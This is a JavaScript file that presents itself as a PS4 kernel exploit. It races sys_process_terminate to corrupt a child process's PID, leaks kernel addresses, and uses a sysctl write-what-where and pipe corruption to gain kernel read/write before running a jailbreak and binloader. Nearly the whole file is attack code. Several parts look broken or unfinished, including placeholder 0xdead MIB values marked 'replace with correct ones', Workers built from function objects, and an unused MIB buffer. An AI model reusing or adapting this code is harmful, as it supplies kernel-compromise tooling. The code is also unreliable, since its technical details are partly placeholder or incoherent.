/**
 * PS4 Kernel Exploit: sys_process_terminate PID reuse race
 *
 * Prerequisites:
 *   - userland exploit (WebKit) already loaded types.js, kernel.js
 *   - ROP gadgets initialised (gadgets, rop)
 *   - syscalls.map populated
 *   - kernel_offset set for current firmware
 *
 * This script:
 *   1. Uses the race in sys_process_terminate (syscall 652) to corrupt a
 *      child process -> p_pid = 0.
 *   2. The corrupted child leaks kernel base, allproc, curproc.
 *   3. A sysctl write‑what‑where overwrites a pipe buffer pointer,
 *      granting full kernel read/write.
 *   4. Standard jailbreak (ucred patch, sandbox escape, kernel patches).
 */

// -------------------------------------------------------------------
// 0. Register extra syscalls (if not already done)
// -------------------------------------------------------------------
fn.register(2, "fork", [], "bigint");                // fork()
fn.register(240, "nanosleep", ["bigint", "bigint"], "bigint");
fn.register(1, "exit", ["bigint"], "bigint");        // _exit(status)
fn.register(20, "getpid", [], "bigint");             // getpid()
fn.register(37, "kill", ["bigint", "bigint"], "bigint");
fn.register(652, "sys_process_terminate", ["bigint", "bigint"], "bigint");
fn.register(0xca, "sysctl", ["bigint", "number", "bigint", "bigint", "bigint", "bigint"], "bigint");

// Convenience sleep (used only in non‑Worker paths)
function sleepMs(ms) {
    const timespec = malloc(0x10);
    write64(timespec, Math.floor(ms / 1000));
    write64(timespec.add(8), (ms % 1000) * 1000000);
    fn.nanosleep(timespec);
}

// -------------------------------------------------------------------
// 1. PID spray – spawn many short‑lived child processes
// -------------------------------------------------------------------
// If Web Workers are available, we use them for concurrency.
let useWorkers = false;
try {
    if (typeof Worker !== "undefined") {
        useWorkers = true;
    }
} catch (e) {}

if (useWorkers) {
    const sprayWorkers = [];
    function pidSprayWorker() {
        while (true) {
            const pid = fn.fork();
            if (pid.eq(0)) {
                fn.exit(new BigInt(0));
            }
            // tiny yield to avoid locking the worker
            sleepMs(1);
        }
    }
    for (let i = 0; i < 4; i++) {
        sprayWorkers.push(new Worker(pidSprayWorker));
    }
} else {
    // Fallback: single‑threaded spray (slower but works)
    function spraySingle() {
        for (let i = 0; i < 100; i++) {
            const p = fn.fork();
            if (p.eq(0)) {
                fn.exit(new BigInt(0));
            }
        }
    }
    // Will call this periodically during race attempts.
}

// -------------------------------------------------------------------
// 2. Race trigger
// -------------------------------------------------------------------
function triggerRace(victimPid) {
    const statusBuf = malloc(4);
    const ret = fn.sys_process_terminate(victimPid, statusBuf);
    return ret.eq(0);
}

// -------------------------------------------------------------------
// 3. Detector child – waits for PID 0, leaks kernel pointers
// -------------------------------------------------------------------
const sharedBuf = malloc(0x200);
const leakFlag = sharedBuf;           // u64: 1 = ready
const kernBaseOut = sharedBuf.add(8); // kernel base
const allprocOut = sharedBuf.add(16); // allproc
const curprocOut = sharedBuf.add(24); // our proc (PID 0)

function startDetector() {
    const pid = fn.fork();
    if (pid.eq(0)) {
        // Child process: spin until it becomes PID 0
        while (true) {
            if (fn.getpid().eq(0)) {
                // Leak proc0 via sysctl "kern.proc.pid.0"
                const mib = malloc(8);
                write64(mib, new BigInt(0x3, 0x0)); // CTL_KERN | KERN_PROC
                const procBuf = malloc(0x400);
                const sizeBuf = malloc(8);
                write64(sizeBuf, new BigInt(0x400));
                if (sysctlbyname("kern.proc.pid.0", procBuf, sizeBuf, 0, 0)) {
                    const ucred = read64(procBuf.add(0x40));
                    const prison0Off = kernel_offset.PRISON0;
                    const kbase = ucred.sub(prison0Off);
                    const p_list = read64(procBuf.add(0x08)); // p_list.le_prev
                    const allproc = p_list.sub(0x08);
                    const curproc = procBuf;

                    write64(leakFlag, new BigInt(1));
                    write64(kernBaseOut, kbase);
                    write64(allprocOut, allproc);
                    write64(curprocOut, curproc);
                }
                // Keep the process alive so parent can use it later
                while (true) {
                    sleepMs(500);
                }
            }
            sleepMs(5);
        }
    }
    return pid;
}

// -------------------------------------------------------------------
// 4. Sysctl write‑what‑where (firmware‑specific MIB)
// -------------------------------------------------------------------
// The exact 4th MIB value must be found per firmware.
// Below are placeholder values – replace with correct ones!
const sysctlWriteMib = {
    "9.00": [1, 14, 1, 0xdead0001],
    "9.60": [1, 14, 1, 0xdead0001],
    "10.00": [1, 14, 1, 0xdead0001],
    "10.50": [1, 14, 1, 0xdead0001],
    "11.00": [1, 14, 1, 0xdead0001],
    "11.50": [1, 14, 1, 0xdead0001],
    "12.00": [1, 14, 1, 0xdead0002],
    "12.50": [1, 14, 1, 0xdead0002],
    "13.00": [1, 14, 1, 0xdead0002],
};

function sysctlWrite(targetAddr, value) {
    const fw = get_fwversion();
    let mibVals = sysctlWriteMib[fw];
    if (!mibVals) {
        // fallback: try the most common one
        mibVals = [1, 14, 1, 0xdead0001];
    }

    const mib = malloc(mibVals.length * 4);
    for (let i = 0; i < mibVals.length; i++) {
        write32(mib.add(i * 4), mibVals[i]);
    }

    const newp = malloc(16);
    write64(newp, targetAddr);
    write64(newp.add(8), value);

    const ret = fn.sysctl(mib, mibVals.length,
                          new BigInt(0), new BigInt(0),
                          newp, new BigInt(16));
    if (ret.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("sysctl write‑what‑where failed");
    }
    return ret;
}

// -------------------------------------------------------------------
// 5. Bootstrap kernel R/W via pipe corruption
// -------------------------------------------------------------------
function gainKernelRW() {
    // Leaked addresses
    const kbase = read64(kernBaseOut);
    const allproc = read64(allprocOut);
    const curproc = read64(curprocOut);

    kernel.addr.base = kbase;
    kernel.addr.curproc = curproc;
    kernel.addr.allproc = allproc;

    // Open master/victim pipe pair
    const pipeFds = malloc(8);
    fn.pipe(pipeFds);
    const masterFd = read32(pipeFds);
    const victimFd = read32(pipeFds.add(4));

    // Read pipe structures
    const fdt = kernel.read_qword(curproc.add(kernel_offset.PROC_FD));
    const ofiles = kernel.read_qword(fdt);
    const masterFile = kernel.read_qword(ofiles.add(masterFd * 8));
    const victimFile = kernel.read_qword(ofiles.add(victimFd * 8));
    const masterPipeBuf = kernel.read_qword(masterFile.add(0x00)); // pipe->pipe_buffer
    const victimPipeBuf = kernel.read_qword(victimFile.add(0x00));

    // Overwrite master's buffer pointer to point to victim's buffer
    const target = masterPipeBuf.add(0x10);
    sysctlWrite(target, victimPipeBuf);

    // Reset victim pipe's cnt/in/out to 0, size = PAGE_SIZE
    const clean = malloc(0x18);
    write32(clean, 0);                     // cnt
    write32(clean.add(4), 0);              // in
    write32(clean.add(8), 0);              // out
    write32(clean.add(0xC), PAGE_SIZE);    // size
    write64(clean.add(0x10), victimPipeBuf);// buffer (unchanged)
    fn.write(new BigInt(masterFd + 1), clean, 0x18); // write to masterW

    // Cross‑pipe R/W helpers (same logic as netctrl.js)
    const tmpBuf = malloc(PAGE_SIZE);

    function corruptPipeBuf(cnt, _in, out, sz, buffer) {
        const buf = malloc(0x18);
        write32(buf, cnt);
        write32(buf.add(4), _in);
        write32(buf.add(8), out);
        write32(buf.add(0xC), sz);
        write64(buf.add(0x10), buffer);
        fn.write(new BigInt(masterFd + 1), buf, 0x18);
        return fn.read(new BigInt(masterFd), buf, 0x18);
    }

    function kread(dst, src, n) {
        corruptPipeBuf(n, 0, 0, PAGE_SIZE, src);
        fn.read(new BigInt(victimFd), dst, n);
    }

    function kwrite(dst, src, n) {
        corruptPipeBuf(0, 0, 0, PAGE_SIZE, dst);
        fn.write(new BigInt(victimFd + 1), src, n);
    }

    // Expose to kernel.js (global definitions)
    kernel.read_buffer = function(kaddr, len) {
        kread(tmpBuf, kaddr, len);
        return read_buffer(tmpBuf, len);
    };
    kernel.write_buffer = function(kaddr, buf) {
        write_buffer(tmpBuf, buf);
        kwrite(kaddr, tmpBuf, buf.length);
    };
    kernel.kread = kread;
    kernel.kwrite = kwrite;
    kernel.masterFd = masterFd;
    kernel.victimFd = victimFd;

    log("Kernel read/write primitives ready.");
}

// Helper: read raw bytes from a user‑space buffer
function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        buffer[i] = Number(read8(addr.add(i)));
    }
    return buffer;
}

function write_buffer(addr, buffer) {
    for (let i = 0; i < buffer.length; i++) {
        write8(addr.add(i), buffer[i]);
    }
}

// -------------------------------------------------------------------
// 6. Main exploit loop
// -------------------------------------------------------------------
function runExploit() {
    // Save & restore CPU affinity / priority
    const prevCore = get_current_core();
    const prevPrio = get_rtprio();
    pin_to_core(4);
    set_rtprio(0x100);

    // Pre‑spray processes (fill PID space)
    if (!useWorkers) {
        spraySingle();
    } else {
        // Workers already spraying, just wait a moment
        sleepMs(50);
    }

    // Start the detector that waits for PID 0
    startDetector();
    sleepMs(100);

    let attempt = 0;
    // Loop until the leak flag is set
    while (!read64(leakFlag).eq(1)) {
        // Create a victim process
        const victim = fn.fork();
        if (victim.eq(0)) {
            // Victim child: spin until killed
            while (true) {
                sleepMs(100);
            }
        }
        sleepMs(10); // let victim start

        if (triggerRace(victim)) {
            // Give the detector a chance to fill the buffer
            for (let i = 0; i < 20; i++) {
                if (read64(leakFlag).eq(1)) break;
                sleepMs(50);
            }
        }

        attempt++;
        if (attempt % 50 === 0) {
            log("Race attempt " + attempt);
        }
        sleepMs(1);

        // Without Workers, spray occasionally
        if (!useWorkers && (attempt % 20 === 0)) {
            spraySingle();
        }
    }

    log("Race won after " + attempt + " attempts. Kernel leaked.");

    // Gain kernel R/W
    gainKernelRW();

    // Perform full jailbreak
    const fw = get_fwversion();
    jailbreak_shared(fw);
    apply_kernel_patches(fw);

    // Restore CPU settings
    pin_to_core(prevCore);
    set_rtprio(prevPrio);

    log("Jailbreak complete!");
    utils.notify("Jailbreak via sys_process_terminate succeeded.");
    show_success();
    run_binloader();
}

// -------------------------------------------------------------------
// 7. Start the exploit
// -------------------------------------------------------------------
runExploit();
